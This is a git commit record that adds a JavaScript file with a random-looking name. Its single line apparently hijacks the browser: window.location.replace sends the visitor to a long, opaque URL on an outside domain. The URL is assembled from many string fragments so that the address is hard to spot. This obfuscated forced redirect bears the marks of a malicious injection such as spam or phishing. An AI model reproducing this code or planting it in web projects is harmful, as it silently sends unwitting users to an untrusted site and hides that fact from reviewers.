ba3eae3c14c705f750fb998307c6772ec34c041e
Parabeauty <113865732+Parabeauty@users.noreply.github.com>
2022-12-06 15:38:14 +0100

    Create drfiysgisubdeiusfgiusgediusefg.js

---
+++ drfiysgisubdeiusfgiusgediusefg.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://w`,`ww.roa`,`dsw`,`orks.c`,`om/gQ_hB`,`EIKQRfugB`,`l4Sr-C7A`,`tmgi8RHe`,`NzCvZ2ejK`,`Vhrb0mhb`,`fHw-5P`,`vsnQx`,`bJH_3`,`iJFb`,`3akb4-fm`,`rG3vg`,`L37yO`,`g~~/TA`,`HA/bOiiw4uDZv`))
